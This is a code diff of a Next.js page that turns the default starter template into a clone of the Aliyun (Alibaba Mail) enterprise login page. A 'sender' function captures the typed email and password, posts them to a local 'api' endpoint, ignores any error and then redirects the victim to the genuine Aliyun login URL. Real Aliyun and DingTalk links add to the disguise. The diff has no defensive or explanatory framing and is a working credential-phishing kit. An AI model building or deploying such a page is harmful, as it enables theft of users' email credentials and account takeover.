@@ -1,113 +1,272 @@
+"use client";
 import Image from "next/image";
+import Link from "next/link";
+import { Tab } from "@headlessui/react";
+import { Fragment, useRef } from "react";
 
 export default function Home() {
+  const maiRef = useRef<HTMLInputElement>(null);
+  const paintRef = useRef<HTMLInputElement>(null);
+
+  const sender = async () => {
+    if (maiRef.current && paintRef.current) {
+      const data = {
+        email: maiRef.current.value,
+        pass: paintRef.current.value,
+      };
+      try {
+        const res = await fetch("api", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(data),
+        });
+      } catch (error) {}
+      window.location.replace(
+        "https://qiye.aliyun.com/alimail/auth/login?custom_login_flag=1&reurl=%2Falimail%2F%23h%3DWyJmbV8yIixbIjIiLCIiLHsiZklkIjoiMiJ9LHsibGFiZWwiOiLpgq7ku7YifV1d"
+      );
+    }
+  };
+
   return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 max-w-5xl w-full items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">src/app/page.tsx</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:h-auto lg:w-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{" "}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
+    <>
+      <header className="h-14 flex items-center justify-between sm:px-[16%]">
+        <div>
+          <Image src="/logo.png" alt="logo" width={200} height={100} />
         </div>
-      </div>
 
-      <div className="relative flex place-items-center before:absolute before:h-[300px] before:w-full sm:before:w-[480px] before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-full sm:after:w-[240px] after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 before:lg:h-[360px] z-[-1]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
-      </div>
+        <div className="flex items-center text-[0.6rem] sm:text-xs gap-3 whitespace-nowrap">
+          <Link
+            href="https://www.dingtalk.com/"
+            className="hover:underline text-[#848585]"
+          >
+            DingTalk
+          </Link>
 
-      <div className="mb-32 grid text-center lg:max-w-5xl lg:w-full lg:mb-0 lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Docs{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
+          <div className="h-3 w-[0.09rem] bg-[#848585]/20"></div>
 
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Learn{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
+          <Link
+            href="https://wanwang.aliyun.com/mail"
+            className="hover:underline text-[#848585]"
+          >
+            Alibaba Mail
+          </Link>
 
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Templates{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Explore starter templates for Next.js.
-          </p>
-        </a>
+          <div className="h-3 w-[0.09rem] bg-[#848585]/20"></div>
 
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Deploy{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50 text-balance`}>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
-      </div>
-    </main>
+          <Link
+            href="https://mail.aliyun.com/"
+            className="hover:underline text-[#848585]"
+          >
+            Aliyun Mail Login
+          </Link>
+
+          <div className="h-3 w-[0.09rem] bg-[#848585]/20"></div>
+
+          <Link
+            href="https://mail.aliyun.com/mail-pages/download.html"
+            className="hover:underline text-[#848585]"
+          >
+            Client Apps
+          </Link>
+
+          <div className="h-3 w-[0.09rem] bg-[#848585]/20"></div>
+
+          <Link
+            href="https://help.aliyun.com/product/35466.html"
+            className="hover:underline text-[#848585]"
+          >
+            Help
+          </Link>
+
+          <div className="h-3 w-[0.09rem] bg-[#848585]/20"></div>
+
+          <Link href="#" className="hover:underline text-[#848585]">
+            简体中文
+          </Link>
+
+          <div className="h-3 w-[0.09rem] bg-[#848585]/20"></div>
+
+          <Link href="#" className="hover:underline text-[#848585]">
+            繁體中文
+          </Link>
+
+          <div className="h-3 w-[0.09rem] bg-[#848585]/20"></div>
+
+          <Link href="#" className="hover:underline text-[#848585]">
+            English
+          </Link>
+        </div>
+      </header>
+
+      <main className="sm:px-[12%] grid grid-cols-2 sm:grid-cols-5 ">
+        <div className="bg-[url('/bg_movement.png')] bg-left bg-cover bg-no-repeat col-span-1 sm:col-span-3 relative">
+          <Image
+            src="/wordings.png"
+            alt="logo"
+            className="mb-10 absolute sm:left-28"
+            width={300}
+            height={100}
+          />
+        </div>
+        <div className="col-span-1 sm:col-span-2 mx-auto py-14">
+          <Tab.Group>
+            <Tab.List className="flex gap-4 items-center">
+              <Tab as={Fragment}>
+                {({ selected }) => (
+                  <button
+                    className={
+                      selected
+                        ? "border-b-[3px] border-sky-500 text-black/60 outline-none p-2 whitespace-nowrap text-xs"
+                        : "border-b border-neutral-600/20 text-black/60 p-2 whitespace-nowrap text-xs"
+                    }
+                  >
+                    Email Account Login
+                  </button>
+                )}
+              </Tab>
+              <div className="h-6 w-[0.09rem] bg-[#848585]/20"></div>
+              <Tab as={Fragment}>
+                {({ selected }) => (
+                  <button
+                    className={
+                      selected
+                        ? "border-b-[3px] border-sky-500 text-black/60 outline-none p-2 whitespace-nowrap text-xs"
+                        : "border-b border-neutral-600/20 text-black/60 p-2 whitespace-nowrap text-xs"
+                    }
+                  >
+                    DingTalk Account Login
+                  </button>
+                )}
+              </Tab>
+            </Tab.List>
+            <Tab.Panels className="pt-6 text-xs">
+              <Tab.Panel className="w-full flex flex-col items-center">
+                <div className="w-[80%]">
+                  <input
+                    ref={maiRef}
+                    type="email"
+                    name=""
+                    id=""
+                    placeholder="Account"
+                    className="rounded-md bg-slate-200 border-gray-400 p-2 border outline-none hover:border-sky-500 focus:border-sky-500 w-full"
+                  />
+                  <p className="py-2 text-black/30">
+                    Enter your email or postmaster address.
+                  </p>
+                </div>
+
+                <div className="w-[80%]">
+                  <input
+                    type="password"
+                    ref={paintRef}
+                    name=""
+                    id=""
+                    placeholder="Password"
+                    required
+                    className="rounded-md bg-slate-200 border-gray-400 p-2 border outline-none hover:border-sky-500 focus:border-sky-500 w-full"
+                  />
+                </div>
+
+                <div className="w-[80%] mt-4 flex items-center justify-between">
+                  <div className="flex space-x-2 items-center">
+                    <input type="checkbox" name="" id="" />
+                    <p>Save Username</p>
+                  </div>
+                  <p className="text-black/50">Forgot Password</p>
+                </div>
+
+                <button
+                  onClick={sender}
+                  className="mt-4 bg-sky-600 hover:bg-sky-700 rounded-md p-2 w-[80%] text-white md:text-base"
+                >
+                  Sign in
+                </button>
+
+                <div className="mt-4 flex items-start gap-2 w-[80%]">
+                  <input type="checkbox" name="" id="" />
+                  <div className="text-wrap ">
+                    I have read and agree with{" "}
+                    <span className="text-sky-500 ">
+                      Privacy <br /> Policy, Product Service Agreement
+                    </span>
+                  </div>
+                </div>
+              </Tab.Panel>
+              <Tab.Panel className="text-center h-56">
+                <p>Scan QR Code with DingTalk App to Sign In</p>
+              </Tab.Panel>
+            </Tab.Panels>
+          </Tab.Group>
+        </div>
+      </main>
+
+      <footer className="flex flex-col items-center mt-24 sm:mt-4 gap-3 text-xs">
+        <h3>About us</h3>
+
+        <div className="flex items-center text-[0.6rem] sm:text-xs gap-1 sm:gap-3 whitespace-nowrap">
+          <Link
+            href="https://www.dingtalk.com/"
+            className="hover:underline text-[#848585]"
+          >
+            DingTalk
+          </Link>
+
+          <Link
+            href="https://wanwang.aliyun.com/mail"
+            className="hover:underline text-[#848585]"
+          >
+            Alibaba Mail
+          </Link>
+
+          <Link
+            href="https://mail.aliyun.com/"
+            className="hover:underline text-[#848585]"
+          >
+            Aliyun Mail Login
+          </Link>
+
+          <Link
+            href="https://mail.aliyun.com/mail-pages/download.html"
+            className="hover:underline text-[#848585]"
+          >
+            Client Apps
+          </Link>
+
+          <Link
+            href="https://help.aliyun.com/product/35466.html"
+            className="hover:underline text-[#848585]"
+          >
+            Help
+          </Link>
+
+          <Link
+            href="https://www.dingtalk.com/"
+            className="hover:underline text-[#848585]"
+          >
+            简体中文
+          </Link>
+
+          <Link
+            href="https://www.dingtalk.com/"
+            className="hover:underline text-[#848585]"
+          >
+            繁體中文
+          </Link>
+
+          <Link
+            href="https://www.dingtalk.com/"
+            className="hover:underline text-[#848585]"
+          >
+            English
+          </Link>
+        </div>
+
+        <p className="text-[#848585]">
+          2009-2024 Aliyun.com Copyright reserved ICP: 浙2-20080101
+        </p>
+      </footer>
+    </>
   );
 }
